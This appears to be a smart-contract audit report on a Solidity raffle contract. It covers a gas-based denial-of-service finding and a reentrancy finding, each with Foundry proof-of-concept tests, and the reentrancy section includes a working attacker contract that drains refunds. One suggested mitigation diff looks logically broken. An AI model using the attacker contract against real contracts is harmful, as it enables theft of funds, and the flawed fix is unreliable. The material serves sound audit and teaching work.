### [M-#] Looping through players array to check for duplicates in `PuppleRaffle::enterRaffle` is a potential denial of service (DOS) attack, incrementing gas costs for future entrants

**Description:**  The `PurpleRaffle::enterRaffle` function loops through `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramaticaally lower than those who enter later. Every additional player is an additional check the loop will have to make.

```javascript
          // audit Denial of Service (DoS)
    @>    for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }        
```

**Impact:** The gas costs for raffle entrants will increase greatly as more players enter the raffle. There will be a rush at the start of a raffle for players to be first in the queue. An attacker might make array so big that noone else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have two sets of 100 players enter the raffle, the gas costs will be as such:
- 1st 100 players = ~6523172 gas
- 2nd 100 players = ~18995512 gas

This is 3x more expensive for the second players

<details>
<summary>PoC</summary>
Place the following test into `PuppleRaffleTest.t.sol`

```javascript
    function testDenialOfServicerRiskWithManyPlayers() public {
        // gas price set to 1 gwei for easier calculation
        vm.txGasPrice(1);
        // create a large batch of players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 1));
        }
        // measure gas usage
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used to enter raffle with 100 players:", gasUsedFirst);

        // second batch

        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = address(uint160(i + 101));
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;

        console.log("Gas used to enter raffle with 100 players again:", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }
```

</details>


**Recommended Mitigation:**  There are a few recommendations

1. Consider allowing duplicates. Users can make new wallets addresses anyways, so a duplicate doesnt prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [H-1] Reentrancy Vulnerability in refund() Function (Improper State Update Order + External Call Before State Change)

**Description:** The refund() function in the PuppyRaffle contract performs an external call to payable(msg.sender).sendValue(entranceFee) before updating the contract’s internal state (players[playerIndex] = address(0)).
This allows a malicious player to exploit reentrancy by triggering the refund() function multiple times through a fallback or receive() function, draining multiple refunds before the player’s entry is cleared from the players array.

```javascript
@>    //audit reentrancy attack, the contracts sends eth before removing the player, add nonreentranct from openzeppelin
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
```

**Impact:**  A malicious user could repeatedly trigger the refund process to receive multiple refunds for a single entry, leading to a loss of contract funds and denial of service for other legitimate players.

**Proof of Concept:**

- Attacker joins the raffle as a player.
- The attacker deploys a malicious contract with a fallback/receive function that calls refund() again upon receiving Ether.
- When the attacker calls refund(), the external call to sendValue() triggers the fallback and recursively calls refund() before the players[playerIndex] value is set to address(0).
- The attacker can drain the raffle funds through repeated refunds.

Add the following to `PuppleRaffleTest.t.sol` test file

<details>
<summary>Code</summary>

```javascript
function testReentrancyAttackRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(puppyRaffle);
        address attackerUser = makeAddr("attackerUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startingAttackContractBalance = address(reentrancyAttacker).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        vm.prank(attackerUser);
        reentrancyAttacker.attack{value: entranceFee}();

        console2.log("starting attacker contract balance:", startingAttackContractBalance);
        console2.log("starting pupple raffle contract balance:", startingPuppyRaffleBalance);

        console2.log("ending attacker contract balance:", address(reentrancyAttacker).balance);
        console2.log("ending puppy raffle contract balance:", address(puppyRaffle).balance);
    }

}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 indexOfAttacker;

    constructor(PuppyRaffle _puppleRaffle) {
        puppyRaffle = _puppleRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        indexOfAttacker = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfAttacker);
    }
    
    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(indexOfAttacker);
        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}
```

</details>

**Recommended Mitigation:** 

- Update the contract’s state before performing external calls:

```diff
-  payable(msg.sender).sendValue(entranceFee);
-  players[playerIndex] = address(0);
```

```diff
+ players[playerIndex] = address(0);
+ payable(msg.sender).sendValue(entranceFee);
```

- Apply the nonReentrant modifier from OpenZeppelin’s ReentrancyGuard to prevent nested calls.

```diff
+ import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
```

